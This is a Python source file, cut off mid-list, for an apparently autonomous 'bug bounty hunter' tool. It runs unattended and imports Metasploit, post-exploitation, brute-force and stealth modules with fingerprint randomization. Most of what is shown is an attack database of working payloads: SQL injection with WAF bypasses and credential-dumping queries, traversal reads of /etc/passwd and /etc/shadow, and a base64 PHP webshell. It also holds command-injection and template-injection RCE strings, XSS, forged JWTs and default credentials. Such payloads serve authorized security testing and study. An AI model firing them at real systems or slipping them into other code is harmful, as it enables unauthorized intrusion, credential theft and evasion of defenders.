#!/usr/bin/env python3
"""
VIPER Core v5.0 - Autonomous Bug Bounty Hunter

Integrated bug bounty hunting system with:
- Full reconnaissance (subdomains, ports, tech fingerprinting)
- Attack surface mapping (parameters, APIs, JS analysis)
- Nuclei vulnerability scanning
- Manual attack execution
- LLM-assisted analysis
- Bug bounty scope management
- Knowledge graph (Neo4j / SQLite dual-backend)
- Pure-Python orchestrator with multi-agent parallelization
- Advanced guardrails + attack skill classification
- Wappalyzer fingerprinting (6K technologies)
- MITRE CWE/CAPEC enrichment
- CypherFix auto-remediation
- CISO-quality narrative reports with CVSS v4.0
- OAuth/WebSocket/Race condition/Business logic testing
- Self-learning from failures + cross-target correlation
- TLS fingerprint randomization + human-like timing
- Evidence chain of custody with HMAC signing
- Real-time finding notifications (Discord/Telegram/Email)

Run it and walk away. Come back to findings.
"""

import asyncio
import aiohttp
import json
import os
import random
import re
import time
import urllib.parse
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Set, Any
from dataclasses import dataclass, field
from collections import defaultdict
import hashlib

# Add Go tools to PATH if available (for nuclei, httpx, subfinder, etc.)
_go_bin = os.path.join(os.path.expanduser("~"), "go", "bin")
if os.path.isdir(_go_bin):
    os.environ["PATH"] = _go_bin + os.pathsep + os.environ.get("PATH", "")

HACKAGENT_DIR = Path(__file__).parent
CORE_DIR = HACKAGENT_DIR / "core"
LOGS_DIR = HACKAGENT_DIR / "logs"
REPORTS_DIR = HACKAGENT_DIR / "reports"
DATA_DIR = HACKAGENT_DIR / "data"

for d in [CORE_DIR, LOGS_DIR, REPORTS_DIR, DATA_DIR]:
    d.mkdir(exist_ok=True)

STATE_FILE = CORE_DIR / "viper_state.json"
KNOWLEDGE_FILE = CORE_DIR / "viper_knowledge.json"
METRICS_FILE = CORE_DIR / "viper_metrics.json"

# Import new modules
try:
    import sys as _sys
    if str(HACKAGENT_DIR) not in _sys.path:
        _sys.path.insert(0, str(HACKAGENT_DIR))

    from recon.recon_engine import ReconEngine
    from recon.surface_mapper import SurfaceMapper
    from scanners.nuclei_scanner import NucleiScanner
    from ai.llm_analyzer import LLMAnalyzer
    from scope.scope_manager import ScopeManager, BugBountyScope, ScopeViolationError
    MODULES_AVAILABLE = True
except ImportError as e:
    MODULES_AVAILABLE = False

# Import VIPER 2.0 upgrade modules
try:
    from tools.tool_manager import ToolManager
    from tools.http_client import HackerHTTPClient, RequestResult
    from core.viper_db import ViperDB
    from core.finding_validator import FindingValidator
    from core.poc_generator import PoCGenerator
    from core.fuzzer import SmartFuzzer, GrammarFuzzer, PayloadMutator
    UPGRADE_AVAILABLE = True
except ImportError as e:
    UPGRADE_AVAILABLE = False

try:
    from core.compliance_mapper import enrich_finding as _enrich_compliance
    from core.compliance_mapper import format_compliance_section
    COMPLIANCE_AVAILABLE = True
except ImportError:
    COMPLIANCE_AVAILABLE = False

try:
    from core.evograph import EvoGraph
    EVOGRAPH_AVAILABLE = True
except ImportError:
    EVOGRAPH_AVAILABLE = False

try:
    from core.notifier import Notifier
    NOTIFIER_AVAILABLE = True
except ImportError:
    NOTIFIER_AVAILABLE = False

try:
    from core.secret_scanner import SecretScanner
    SECRET_SCANNER_AVAILABLE = True
except ImportError:
    SECRET_SCANNER_AVAILABLE = False

try:
    from core.html_reporter import generate_report as _generate_html_report
    from core.html_reporter import save_report as _save_html_report
    HTML_REPORTER_AVAILABLE = True
except ImportError:
    HTML_REPORTER_AVAILABLE = False

try:
    from core.stealth import StealthEngine
    STEALTH_AVAILABLE = True
except ImportError:
    STEALTH_AVAILABLE = False

try:
    from scanners.gvm_scanner import GVMScanner
    GVM_AVAILABLE = True
except ImportError:
    GVM_AVAILABLE = False

# VIPER 3.0: Phase-aware execution engine
try:
    from core.phase_engine import PhaseEngine, Phase
    PHASE_ENGINE_AVAILABLE = True
except ImportError:
    PHASE_ENGINE_AVAILABLE = False

# VIPER 3.0: Attack graph database
try:
    from core.attack_graph import AttackGraph
    ATTACK_GRAPH_AVAILABLE = True
except ImportError:
    ATTACK_GRAPH_AVAILABLE = False

# VIPER 3.0: Web crawler + JS analysis
try:
    from recon.web_crawler import WebCrawler
    WEB_CRAWLER_AVAILABLE = True
except ImportError:
    WEB_CRAWLER_AVAILABLE = False

# VIPER 3.0: MITRE ATT&CK enrichment
try:
    from core.mitre_mapper import enrich_finding_mitre, get_attack_narrative
    MITRE_AVAILABLE = True
except ImportError:
    MITRE_AVAILABLE = False

# VIPER 3.0: LLM guardrails
try:
    from core.guardrails import TargetGuardrail, InputSanitizer
    GUARDRAILS_AVAILABLE = True
except ImportError:
    GUARDRAILS_AVAILABLE = False

# VIPER 3.0: Brute force engine
try:
    from tools.brute_forcer import BruteForcer
    BRUTE_FORCER_AVAILABLE = True
except ImportError:
    BRUTE_FORCER_AVAILABLE = False

# VIPER 3.0: Metasploit integration
try:
    from tools.metasploit import MetasploitClient
    METASPLOIT_AVAILABLE = True
except ImportError:
    METASPLOIT_AVAILABLE = False

# VIPER 3.0: Code remediation agent
try:
    from agents.codefix_agent import CodeFixAgent
    CODEFIX_AVAILABLE = True
except ImportError:
    CODEFIX_AVAILABLE = False

# VIPER 3.0: Post-exploitation framework
try:
    from agents.post_exploit import PostExploitAgent
    POST_EXPLOIT_AVAILABLE = True
except ImportError:
    POST_EXPLOIT_AVAILABLE = False

# ══════════════════════════════════════════════════════════════════════
# VIPER 4.0: New module imports
# ══════════════════════════════════════════════════════════════════════

# Knowledge Graph Engine
try:
    from core.graph_engine import GraphEngine
    from core.chain_writer import ChainWriter
    from core.graph_query import GraphQueryEngine
    GRAPH_ENGINE_AVAILABLE = True
except ImportError:
    GRAPH_ENGINE_AVAILABLE = False

# Agent Orchestrator
try:
    from core.orchestrator import ViperOrchestrator
    from core.agent_state import Phase as OrcPhase
    from core.think_engine import ThinkEngine
    ORCHESTRATOR_AVAILABLE = True
except ImportError:
    ORCHESTRATOR_AVAILABLE = False

# Advanced Guardrails
try:
    from core.guardrail_hard import is_blocked as hard_guardrail_check
    from core.guardrail_llm import check_target_allowed as llm_guardrail_check
    ADVANCED_GUARDRAILS_AVAILABLE = True
except ImportError:
    ADVANCED_GUARDRAILS_AVAILABLE = False

# Skill Classification
try:
    from core.skill_classifier import classify_attack
    from core.skill_prompts import get_skill_prompt
    SKILL_CLASSIFIER_AVAILABLE = True
except ImportError:
    SKILL_CLASSIFIER_AVAILABLE = False

# Enhanced Recon
try:
    from recon.wappalyzer import Wappalyzer
    from recon.mitre_enricher import MitreEnricher
    from recon.shodan_enricher import enrich_ip_sync as shodan_enrich
    from recon.github_secrets import SecretScanner as GithubSecretScanner
    ENHANCED_RECON_AVAILABLE = True
except ImportError:
    ENHANCED_RECON_AVAILABLE = False

# CypherFix
try:
    from core.triage_engine import TriageEngine
    from core.triage_queries import run_triage_queries
    TRIAGE_AVAILABLE = True
except ImportError:
    TRIAGE_AVAILABLE = False

# Reports
try:
    from core.report_narrative import ReportNarrative
    from core.report_exporter import ReportExporter
    NARRATIVE_REPORT_AVAILABLE = True
except ImportError:
    NARRATIVE_REPORT_AVAILABLE = False

# MCP Tools
try:
    from tools.mcp_tools import MCPToolInterface
    from tools.msf_persistent import PersistentMsfConsole
    MCP_TOOLS_AVAILABLE = True
except ImportError:
    MCP_TOOLS_AVAILABLE = False

# Settings
try:
    from core.settings_manager import SettingsManager
    SETTINGS_AVAILABLE = True
except ImportError:
    SETTINGS_AVAILABLE = False

# Recon Pipeline
try:
    from recon.pipeline import ReconPipeline
    PIPELINE_AVAILABLE = True
except ImportError:
    PIPELINE_AVAILABLE = False

# Dashboard live events
try:
    from dashboard.server import publish_event as _publish_event
    DASHBOARD_EVENTS = True
except ImportError:
    DASHBOARD_EVENTS = False

    def _publish_event(event_type, data):
        pass

# ══════════════════════════════════════════════════════════════════════
# VIPER 5.0: Multi-agent + new attack modules
# ══════════════════════════════════════════════════════════════════════

# Multi-agent bus
try:
    from core.agent_bus import AgentBus, Priority as BusPriority
    from core.agent_registry import AgentRegistry
    AGENT_BUS_AVAILABLE = True
except ImportError:
    AGENT_BUS_AVAILABLE = False

# New attack modules
try:
    from core.oauth_fuzzer import OAuthFuzzer
    OAUTH_FUZZER_AVAILABLE = True
except ImportError:
    OAUTH_FUZZER_AVAILABLE = False

try:
    from core.websocket_fuzzer import WebSocketFuzzer
    WS_FUZZER_AVAILABLE = True
except ImportError:
    WS_FUZZER_AVAILABLE = False

try:
    from core.race_engine import RaceEngine
    RACE_ENGINE_AVAILABLE = True
except ImportError:
    RACE_ENGINE_AVAILABLE = False

try:
    from core.logic_modeler import LogicModeler
    LOGIC_MODELER_AVAILABLE = True
except ImportError:
    LOGIC_MODELER_AVAILABLE = False

# Self-learning upgrades
try:
    from core.failure_analyzer import FailureAnalyzer
    FAILURE_ANALYZER_AVAILABLE = True
except ImportError:
    FAILURE_ANALYZER_AVAILABLE = False

try:
    from core.cross_target_correlator import CrossTargetCorrelator
    CROSS_CORRELATOR_AVAILABLE = True
except ImportError:
    CROSS_CORRELATOR_AVAILABLE = False

try:
    from core.fuzzer import GeneticFuzzer
    GENETIC_FUZZER_AVAILABLE = True
except ImportError:
    GENETIC_FUZZER_AVAILABLE = False

# Stealth & OPSEC upgrades
try:
    from core.stealth import FingerprintRandomizer
    FINGERPRINT_RANDOMIZER_AVAILABLE = True
except ImportError:
    FINGERPRINT_RANDOMIZER_AVAILABLE = False

try:
    from core.rate_limiter import HumanTimingProfile
    HUMAN_TIMING_AVAILABLE = True
except ImportError:
    HUMAN_TIMING_AVAILABLE = False

try:
    from core.chain_of_custody import ChainOfCustody
    CHAIN_OF_CUSTODY_AVAILABLE = True
except ImportError:
    CHAIN_OF_CUSTODY_AVAILABLE = False

# Reporting upgrades
try:
    from core.reporter import CvssV4Score, calculate_cvss4
    CVSS4_AVAILABLE = True
except ImportError:
    CVSS4_AVAILABLE = False

try:
    from core.finding_stream import FindingStream, NotificationConfig
    FINDING_STREAM_AVAILABLE = True
except ImportError:
    FINDING_STREAM_AVAILABLE = False


def _emit(event_type, **data):
    """Safely emit a dashboard event (no-op if dashboard unavailable)."""
    try:
        _publish_event(event_type, data)
    except Exception:
        pass


@dataclass
class Attack:
    """An attack with all its variants"""
    name: str
    category: str  # recon, injection, auth, file, misc
    payloads: List[str]
    indicators: List[str]  # When to try this attack
    success_markers: List[str]  # How to know it worked
    failure_markers: List[str]  # How to know it definitely failed
    followups: List[str]  # What to try next if this works
    
    # Learning stats
    attempts: int = 0
    successes: int = 0
    
    @property
    def success_rate(self) -> float:
        return self.successes / max(self.attempts, 1)
    
    @property
    def confidence(self) -> float:
        if self.attempts < 5:
            return 0.5
        return self.success_rate


@dataclass 
class Target:
    """A target being hunted"""
    url: str
    discovered: datetime = field(default_factory=datetime.now)
    
    # What we know
    technologies: Set[str] = field(default_factory=set)
    endpoints: Set[str] = field(default_factory=set)
    parameters: Set[str] = field(default_factory=set)
    vulns_found: List[Dict] = field(default_factory=list)
    
    # Recon data
    subdomains: Set[str] = field(default_factory=set)
    open_ports: Dict[str, List[int]] = field(default_factory=dict)
    js_endpoints: Set[str] = field(default_factory=set)
    api_endpoints: Set[str] = field(default_factory=set)
    
    # Hunt state
    attacks_tried: Dict[str, int] = field(default_factory=dict)
    last_progress: datetime = field(default_factory=datetime.now)
    access_level: int = 0  # 0=none, 1=info, 2=read, 3=write, 4=shell, 5=root
    
    # Scan results
    nuclei_findings: List[Dict] = field(default_factory=list)
    
    # Metrics
    total_requests: int = 0
    successful_requests: int = 0
    
    def should_try_attack(self, attack_name: str, max_attempts: int = 3) -> bool:
        return self.attacks_tried.get(attack_name, 0) < max_attempts
    
    def record_attack(self, attack_name: str, success: bool):
        self.attacks_tried[attack_name] = self.attacks_tried.get(attack_name, 0) + 1
        if success:
            self.last_progress = datetime.now()
    
    def is_stale(self, minutes: int = 10) -> bool:
        return datetime.now() - self.last_progress > timedelta(minutes=minutes)
    
    def get_untried_attacks(self, all_attacks: List[str]) -> List[str]:
        return [a for a in all_attacks if a not in self.attacks_tried]


class ViperKnowledge:
    """VIPER's learned knowledge base."""
    
    def __init__(self):
        self.attacks: Dict[str, Attack] = {}
        self.tech_signatures: Dict[str, List[str]] = {}
        self.successful_chains: List[List[str]] = []
        self.target_history: Dict[str, Dict] = {}
        
        self._init_attacks()
        self._load()
    
    def _init_attacks(self):
        """Initialize attack database"""
        attacks_data = [
            # === RECON ===
            Attack(
                name="robots_txt",
                category="recon",
                payloads=["/robots.txt"],
                indicators=["http", "://"],
                success_markers=["Disallow:", "Allow:", "User-agent"],
                failure_markers=["404", "Not Found"],
                followups=["dir_bruteforce"]
            ),
            Attack(
                name="git_exposure",
                category="recon",
                payloads=["/.git/HEAD", "/.git/config"],
                indicators=["http"],
                success_markers=["ref:", "[core]", "[remote"],
                failure_markers=["404", "Not Found"],
                followups=["git_dump"]
            ),
            Attack(
                name="env_file",
                category="recon",
                payloads=["/.env", "/.env.local", "/.env.production"],
                indicators=["http"],
                success_markers=["DB_", "API_KEY", "SECRET", "PASSWORD", "TOKEN"],
                failure_markers=["404", "<!DOCTYPE"],
                followups=["credential_use"]
            ),
            Attack(
                name="backup_files",
                category="recon",
                payloads=["/index.php.bak", "/index.php~", "/index.php.old", "/.index.php.swp"],
                indicators=["php"],
                success_markers=["<?php", "<?="],
                failure_markers=["404"],
                followups=["source_analysis"]
            ),
            Attack(
                name="dir_listing",
                category="recon",
                payloads=["/uploads/", "/backup/", "/admin/", "/files/", "/images/"],
                indicators=["http"],
                success_markers=["Index of", "Parent Directory", "<dir>"],
                failure_markers=["403", "404", "Forbidden"],
                followups=["file_enum"]
            ),
            
            # === INJECTION ===
            Attack(
                name="sqli_error",
                category="injection",
                payloads=[
                    # Classic error-based
                    "'", "\"", "')", "\"))", "''", "' OR '1'='1",
                    "\" OR \"1\"=\"1", "1' AND '1'='1", "1 AND 1=1",
                    "' OR 1=1--", "' OR 'x'='x", "') OR ('1'='1",
                    "1' ORDER BY 1--", "1' ORDER BY 10--", "1' ORDER BY 100--",
                    # Boolean blind
                    "' AND 1=1--", "' AND 1=2--", "' OR 1=1#", "admin'--",
                    "' AND 'a'='a", "' AND 'a'='b",
                    # Time-based blind
                    "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
                    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "' OR SLEEP(5)#", "'; SELECT pg_sleep(5)--",
                    "1; WAITFOR DELAY '0:0:5'--",
                    # Stacked queries
                    "'; DROP TABLE test--", "'; SELECT 1--",
                    # WAF bypass
                    "/*!50000UNION*/", "%27", "%2527", "' AnD 1=1--",
                    "' /*!50000OR*/ '1'='1", "' uni%6fn sel%65ct 1--",
                    "' %55NION %53ELECT 1--", "' AND/**/1=1--",
                    # Database-specific
                    "' AND @@version--", "' AND version()--",
                    "' AND sqlite_version()--", "' AND banner FROM v$version--",
                    # Numeric injection
                    "1 OR 1=1", "1) OR (1=1", "-1 OR 1=1",
                    "1; SELECT 1", "1 HAVING 1=1",
                ],
                indicators=["=", "id", "user", "name", "search", "query", "select", "item", "cat", "page", "view"],
                success_markers=[
                    r"SQL[\s\S]{0,40}syntax", r"mysql[\s_]", r"ORA-\d{4,5}",
                    r"PostgreSQL.*ERROR", r"sqlite3?\.", r"ODBC.*Driver",
                    r"Microsoft.*SQL.*Server", r"Unclosed quotation mark",
                    r"pg_query\(\)", r"supplied argument is not a valid MySQL",
                    r"You have an error in your SQL", r"Warning.*mysql_",
                    r"MySqlClient\.", r"com\.mysql\.jdbc",
                    r"org\.postgresql\.util\.PSQLException",
                    r"Dynamic SQL Error", r"Sybase message",
                    r"valid MySQL result", r"Syntax error.*in query expression",
                ],
                failure_markers=[],
                followups=["sqli_union", "sqli_blind"]
            ),
            Attack(
                name="sqli_union",
                category="injection",
                payloads=[
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT 1,2,3,4,5--",
                    "' UNION ALL SELECT NULL,NULL,@@version--",
                    "' UNION ALL SELECT NULL,NULL,version()--",
                    "' UNION SELECT username,password FROM users--",
                    "1 UNION SELECT username,password FROM users--",
                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                    "' UNION SELECT column_name,NULL FROM information_schema.columns--",
                    "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables--",
                    "' UNION SELECT NULL,NULL,NULL FROM dual--",
                    "') UNION SELECT NULL,NULL--",
                    "')) UNION SELECT NULL,NULL--",
                    "' UNION SELECT 1,CONCAT(user(),database())--",
                    # WAF bypass union
                    "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
                    "' %55nion %53elect NULL--",
                    "' uNiOn sElEcT NULL--",
                    "' UNION ALL SELECT NULL-- -",
                ],
                indicators=["sqli_error"],
                success_markers=[
                    r"admin", r"password", r"username",
                    r"root@", r"information_schema",
                    r"\d+\.\d+\.\d+", r"@@version",
                ],
                failure_markers=["blocked", "WAF", "forbidden"],
                followups=["sqli_dump"]
            ),
            Attack(
                name="sqli_blind",
                category="injection",
                payloads=[
                    "' AND SUBSTRING(version(),1,1)='5'--",
                    "' AND (SELECT COUNT(*) FROM users)>0--",
                    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
                    "' AND (SELECT LENGTH(database()))>0--",
                    "' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)--",
                    "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "1 AND 1=1", "1 AND 1=2",
                ],
                indicators=["sqli_error"],
                success_markers=[r"different.*response", r"true.*condition"],
                failure_markers=["blocked", "WAF"],
                followups=["sqli_dump"]
            ),
            Attack(
                name="lfi_basic",
                category="injection",
                payloads=[
                    "/etc/passwd", "../etc/passwd",
                    "../../etc/passwd", "../../../etc/passwd",
                    "../../../../etc/passwd", "../../../../../etc/passwd",
                    "....//....//....//etc/passwd",
                    "..\\..\\..\\..\\etc\\passwd",
                    "/etc/passwd%00", "....//....//etc/passwd%00",
                    "..\\..\\..\\windows\\win.ini%00",
                    "%252e%252e%252fetc/passwd",
                    "..%252f..%252f..%252fetc/passwd",
                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%c0%af..%c0%afetc/passwd",
                    "..%ef%bc%8f..%ef%bc%8fetc/passwd",
                    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
                    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
                    "/var/log/httpd/access_log", "/var/log/auth.log",
                    "/proc/self/environ", "/proc/self/fd/0", "/proc/self/cmdline",
                    "C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "C:\\Windows\\win.ini", "C:\\boot.ini",
                    "....\\\\....\\\\windows\\win.ini",
                    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "/etc/shadow", "/etc/hosts", "/etc/hostname",
                    "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
                    "/etc/mysql/my.cnf", "../../../../../../etc/passwd",
                ],
                indicators=["file", "path", "page", "include", "doc", "template", "load", "lang", "dir", "view"],
                success_markers=[
                    r"root:x?:\d+:\d+", r"/bin/(?:ba)?sh", r"\[extensions\]",
                    r"\[fonts\]", r"root:.*:0:0", r"daemon:.*:",
                    r"\[boot loader\]", r"DocumentRoot", r"server_name",
                ],
                failure_markers=["No such file", "failed to open", "not found"],
                followups=["lfi_wrapper", "log_poison"]
            ),
            Attack(
                name="lfi_wrapper",
                category="injection",
                payloads=[
                    "php://filter/convert.base64-encode/resource=index",
                    "php://filter/convert.base64-encode/resource=index.php",
                    "php://filter/convert.base64-encode/resource=/etc/passwd",
                    "php://filter/convert.base64-encode/resource=config",
                    "php://filter/convert.base64-encode/resource=../config",
                    "php://filter/read=string.rot13/resource=index.php",
                    "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
                    "php://input",
                    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
                    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                    "expect://id",
                    "expect://whoami",
                    "phar://test.phar",
                    "zip://uploads/avatar.zip#shell.php",
                ],
                indicators=["php", "lfi_basic"],
                success_markers=[r"PD9", r"cm9vd", r"base64", r"<\?php", r"phpinfo"],
                failure_markers=["allow_url_include", "not supported"],
                followups=["rce"]
            ),
            Attack(
                name="cmdi_basic",
                category="injection",
                payloads=[
                    ";id", "|id", "||id", "&&id", "`id`", "$(id)",
                    "& id", "\nid", ";ls", "|ls",
                    "; sleep 5", "| sleep 5", "& sleep 5",
                    "|| sleep 5", "&& sleep 5",
                    "& ping -c 5 127.0.0.1 &",
                    "; ping -c 5 127.0.0.1",
                    "| ping -c 5 127.0.0.1",
                    "& whoami", "| dir", "& dir",
                    "& ping -n 5 127.0.0.1", "| type C:\\windows\\win.ini",
                    "& net user", "| systeminfo",
                    "${IFS}id", "i\\d", ";{id}",
                    "$IFS/etc/passwd", ";cat${IFS}/etc/passwd",
                    "%0aid", "%0a%0did",
                    "$(whoami)", "`whoami`", "$({cat,/etc/passwd})",
                    "$(cat</etc/passwd)",
                    "%0a id", "%0d%0a id", "%09id",
                ],
                indicators=["cmd", "exec", "ping", "host", "ip", "system", "run", "command", "shell"],
                success_markers=[
                    r"uid=\d+", r"gid=\d+", r"groups=",
                    r"root:x:", r"www-data",
                    r"Directory of", r"Volume Serial",
                    r"\w+\\\w+", r"NT AUTHORITY",
                    r"total \d+", r"drwx",
                ],
                failure_markers=["not found", "invalid command"],
                followups=["reverse_shell"]
            ),
            Attack(
                name="ssti_basic",
                category="injection",
                payloads=[
                    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "{7*7}", "#{7*7}",
                    "{{7*\'7\'}}", "${{7*7}}",
                    "{{config}}", "{{config.items()}}",
                    "{{self.__init__.__globals__}}",
                    "{{''.__class__.__mro__[1].__subclasses__()}}",
                    "{{request.application.__globals__.__builtins__}}",
                    "{{lipsum.__globals__[\'os\'].popen(\'id\').read()}}",
                    "{% for x in ().__class__.__base__.__subclasses__() %}{{x.__name__}}{% endfor %}",
                    "{%import os%}{{os.popen(\'id\').read()}}",
                    "#set($x = 7 * 7)$x",
                    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                    "<%= 7*7 %>", "<%= system(\"id\") %>",
                    "<%= `id` %>",
                    "${7*7}", "#{7*7}",
                    "T(java.lang.Runtime).getRuntime().exec(\'id\')",
                    "${T(java.lang.System).getenv()}",
                    "{php}echo `id`;{/php}", "{system(\'id\')}",
                    "${__import__(\'os\').popen(\'id\').read()}",
                ],
                indicators=["template", "render", "name", "message", "content", "preview", "bio", "comment"],
                success_markers=[
                    r"(?<!\{)49(?!\})",
                    r"uid=\d+", r"gid=\d+",
                    r"<class \'", r"__class__",
                    r"SECRET_KEY", r"DEBUG",
                    r"root:x:", r"www-data",
                    r"freemarker\.", r"java\.lang",
                ],
                failure_markers=[r"\{\{7\*7\}\}", r"\$\{7\*7\}"],
                followups=["ssti_rce"]
            ),
            Attack(
                name="xss_reflected",
                category="injection",
                payloads=[
                    "<script>alert(1)</script>",
                    "'\"><script>alert(1)</script>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "<svg/onload=alert(1)>",
                    "<body onload=alert(1)>",
                    "<input onfocus=alert(1) autofocus>",
                    "<marquee onstart=alert(1)>",
                    "<video src=x onerror=alert(1)>",
                    "<audio src=x onerror=alert(1)>",
                    "<details open ontoggle=alert(1)>",
                    "<iframe onload=alert(1)>",
                    "\" onmouseover=\"alert(1)",
                    "' onfocus='alert(1)' autofocus='",
                    "\" autofocus onfocus=\"alert(1)",
                    "' onclick='alert(1)'",
                    "javascript:alert(1)",
                    "data:text/html,<script>alert(1)</script>",
                    "javascript:alert(document.domain)",
                    "<scr<script>ipt>alert(1)</script>",
                    "<SCRIPT>alert(1)</SCRIPT>",
                    "<ScRiPt>alert(1)</ScRiPt>",
                    "<script>alert`1`</script>",
                    "<script>alert(1)//",
                    "<img src=x onerror=alert`1`>",
                    "%3Cscript%3Ealert(1)%3C/script%3E",
                    "&#60;script&#62;alert(1)&#60;/script&#62;",
                    "${alert(1)}",
                    "{{constructor.constructor('return this')()}}",
                    "'\"><img src=x onerror=alert(1)//",
                ],
                indicators=["search", "q", "query", "name", "message", "error", "redirect", "url", "ref", "callback"],
                success_markers=[
                    r"<script>alert\(1\)</script>",
                    r"onerror\s*=\s*alert",
                    r"onload\s*=\s*alert",
                    r"onfocus\s*=\s*alert",
                    r"onmouseover\s*=\s*alert",
                    r"onclick\s*=\s*alert",
                    r"ontoggle\s*=\s*alert",
                    r"javascript:alert",
                    r"<svg[^>]*onload",
                    r"<img[^>]*onerror",
                ],
                failure_markers=[r"&lt;script", "blocked", "rejected"],
                followups=["xss_stored"]
            ),
            
            # === AUTH ===
            Attack(
                name="auth_bypass_cookie",
                category="auth",
                payloads=["admin=1", "loggedin=1", "authenticated=true", "role=admin"],
                indicators=["login", "auth", "session", "admin"],
                success_markers=["welcome", "dashboard", "admin", "logout"],
                failure_markers=["denied", "unauthorized", "login"],
                followups=["priv_esc"]
            ),
            Attack(
                name="auth_bypass_header",
                category="auth",
                payloads=[
                    "X-Forwarded-For: 127.0.0.1",
                    "X-Real-IP: 127.0.0.1",
                    "X-Original-URL: /admin"
                ],
                indicators=["admin", "internal", "localhost"],
                success_markers=["admin", "dashboard", "config"],
                failure_markers=["forbidden", "denied"],
                followups=["priv_esc"]
            ),
            Attack(
                name="default_creds",
                category="auth",
                payloads=[
                    "admin:admin", "admin:password", "admin:123456",
                    "root:root", "test:test", "guest:guest"
                ],
                indicators=["login", "username", "password"],
                success_markers=["welcome", "dashboard", "success"],
                failure_markers=["invalid", "incorrect", "failed"],
                followups=["post_auth_enum"]
            ),
            
            # === FILE ===
            Attack(
                name="webdav_put",
                category="file",
                payloads=["PUT /dav/test.txt", "PUT /uploads/test.txt"],
                indicators=["dav", "webdav", "DAV"],
                success_markers=["201", "204", "Created"],
                failure_markers=["405", "403", "Method Not Allowed"],
                followups=["webshell_upload"]
            ),
            Attack(
                name="file_upload",
                category="file",
                payloads=["shell.php", "shell.php.jpg", "shell.phtml", ".htaccess"],
                indicators=["upload", "file", "attach", "image"],
                success_markers=["uploaded", "success"],
                failure_markers=["invalid", "not allowed", "blocked"],
                followups=["webshell_exec"]
            ),

            # === NEW ATTACK TYPES (v2.3) ===

            Attack(
                name="jwt_none_alg",
                category="auth",
                payloads=[
                    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                    "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                    "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.",
                ],
                indicators=["jwt", "token", "bearer", "authorization", "auth"],
                success_markers=["admin", "dashboard", "welcome", "role.*admin", "authenticated"],
                failure_markers=["invalid token", "unauthorized", "expired", "signature"],
                followups=["idor_enum"]
            ),
            Attack(
                name="jwt_weak_secret",
                category="auth",
                payloads=[
                    "secret", "password", "123456", "key", "jwt_secret",
                    "changeme", "test", "admin", "your-256-bit-secret",
                ],
                indicators=["jwt", "token", "bearer", "authorization"],
                success_markers=["admin", "dashboard", "role", "authenticated"],
                failure_markers=["invalid", "unauthorized", "signature"],
                followups=["jwt_none_alg"]
            ),
            Attack(
                name="idor_enum",
                category="auth",
                payloads=[
                    "1", "2", "3", "100", "1000", "0", "-1",
                    "admin", "test", "user",
                    "../1", "../admin",
                ],
                indicators=["id", "user_id", "uid", "account", "profile", "order", "doc", "invoice", "file_id", "msg"],
                success_markers=[
                    r"\"name\"", r"\"email\"", r"\"user\"", r"\"username\"",
                    r"\"phone\"", r"\"address\"", r"\"order\"",
                    r"profile", r"account",
                ],
                failure_markers=["not found", "unauthorized", "forbidden", "no access"],
                followups=["idor_enum"]
            ),
            Attack(
                name="debug_endpoints",
                category="recon",
                payloads=[
                    "/debug", "/debug/vars", "/debug/pprof/",
                    "/_debug", "/server-status", "/server-info",
                    "/elmah.axd", "/trace.axd",
                    "/actuator", "/actuator/env", "/actuator/health",
                    "/actuator/mappings", "/actuator/configprops",
                    "/actuator/beans", "/actuator/heapdump",
                    "/console", "/admin/console",
                    "/__debug__/", "/phpinfo.php",
                    "/info", "/health", "/metrics",
                    "/swagger.json", "/swagger-ui.html",
                    "/api-docs", "/v2/api-docs", "/v3/api-docs",
                    "/_profiler/", "/silk/",
                    "/graphiql", "/altair",
                ],
                indicators=["http"],
                success_markers=[
                    r"phpinfo\(\)", r"PHP Version", r"System.*Linux",
                    r"DOCUMENT_ROOT", r"SERVER_SOFTWARE",
                    r"\"status\".*\"UP\"", r"\"health\"",
                    r"server-status", r"Apache Server",
                    r"pprof", r"goroutine", r"heap",
                    r"swagger", r"openapi", r"\"paths\"",
                    r"actuator", r"configprops", r"beans",
                    r"debug.*vars", r"memstats",
                    r"graphiql", r"GraphQL",
                ],
                failure_markers=["404", "Not Found", "403"],
                followups=["env_file", "source_maps"]
            ),
            Attack(
                name="source_maps",
                category="recon",
                payloads=[
